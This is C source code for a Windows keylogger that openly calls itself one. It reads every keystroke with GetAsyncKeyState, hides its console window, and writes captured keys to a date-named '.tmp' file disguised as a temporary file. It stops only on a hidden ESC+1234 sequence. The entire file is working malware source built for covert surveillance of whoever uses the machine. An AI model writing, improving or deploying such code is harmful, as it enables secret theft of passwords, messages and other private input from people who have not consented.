/*
===========================================================
BASIC KEYLOGGER for windows platforms using
GetAsyncKeyState
@author: Velorek
@version: 0.1
@last modified: AUG 2018
===========================================================
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <time.h>

//CONSTANTS
#define FILENAME "cap"
#define FILEEXTENSION ".tmp"
#define EXITKEY "\e1234\0"
#define CLEANSTR "\0"
#define K_BACKSPACE 8
#define K_CHARBSPACE '<'

//HELP MESSAGES


/* FUNCTION DECLARATIONS */

long    fileSize(FILE * fileHandler);
int     openFile(FILE ** fileHandler, char *fileName, char *mode);
int     closeFile(FILE * fileHandler);
long    writeToFile(FILE * fileHandler,char ch);
int     file_exists(FILE **fileHandler, char *fileStr);
int     kbhit(char *ch);

int kbhit(char *ch){
int i=0, keystate=0;
int exitFlag=0, ok=0;
char oldch=0;

  oldch = *ch;
  //Run through all key scancodes from 0 to 255
  do{
    keystate = GetAsyncKeyState(i);
    if (keystate == -32768) {
            //A key has been pressed
            exitFlag = 1;
            ok=1;
    }
    if (i==255) {
            //Exit if we got to the end
            exitFlag = 1;
            ok=0;
    }
    if (keystate == 0) i++;
  } while(exitFlag != 1);
  //return key pressed
  *ch = i;
  if (*ch == oldch) {
   //Reset if we have the same value as before.
        ok = 0;
  }
  return ok;
}

int main() {
  FILE *fileHandler;
  char charcombination[6];
  char daystr[2];
  char monstr[2];
  char fileStr[80];
  int exitFlag =0;
  int i=0;
  char ch=0;
  time_t now = 0;
  struct tm *ltm;

   //Get time & date
   now = time(0);
   ltm = localtime(&now);

  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
  sprintf(daystr, "%d", ltm->tm_mday);
  sprintf(monstr, "%d", ltm->tm_mon);
  strcpy(fileStr, FILENAME);
  strcat(fileStr, daystr);
  strcat(fileStr, "_");
  strcat(fileStr, monstr);
  strcat(fileStr, FILEEXTENSION);

  if (file_exists(&fileHandler, fileStr) == 1)
    openFile(&fileHandler,fileStr,"a");
  else
    openFile(&fileHandler,fileStr, "w");
  fprintf(fileHandler, "\n%s\n", asctime(ltm));

  do{
     if (kbhit(&ch) == 1) {

            //To exit program -> ESC + 1234
            if (i==0) strcpy(charcombination, CLEANSTR);
            if (ch==27 || i>0) {
                charcombination[i] = ch;
                i++;
                if (i==5) {
                        charcombination[5] ='\0';
                        i=0;
                }
            }
            if (ch>8 && ch<255) writeToFile(fileHandler,ch);
            if (ch==K_BACKSPACE) writeToFile(fileHandler,K_CHARBSPACE);//Backspace
     }
     if (strcmp(charcombination,EXITKEY)==0){
        exitFlag = 1;
     }
  } while (exitFlag != 1);
  return 0;
}


int closeFile(FILE * fileHandler) {
  int     ok;
  ok = fclose(fileHandler);
  return ok;
}

int openFile(FILE ** fileHandler, char *fileName, char *mode) {
  int     ok;
  *fileHandler = fopen(fileName, mode);
  //check whether buffer is assigned
  //and return value
  if(*fileHandler != NULL)
    ok = 1;
  else
    ok = 0;
  return ok;
}

long writeToFile(FILE * fileHandler, char ch) {
  long    byteCount = 0;

  //Read char by char
  if(fileHandler != NULL) {
     fprintf(fileHandler, "%c",ch);
  }
  return byteCount;
}

int file_exists(FILE **fileHandler, char *fileStr){
    int ok = 0;

*fileHandler = fopen(fileStr, "r");
if (*fileHandler != NULL){
   ok = 1;
   fclose(*fileHandler);
}else{
    ok=0;
   //file doesn't exists or cannot be opened
}
return ok;
}

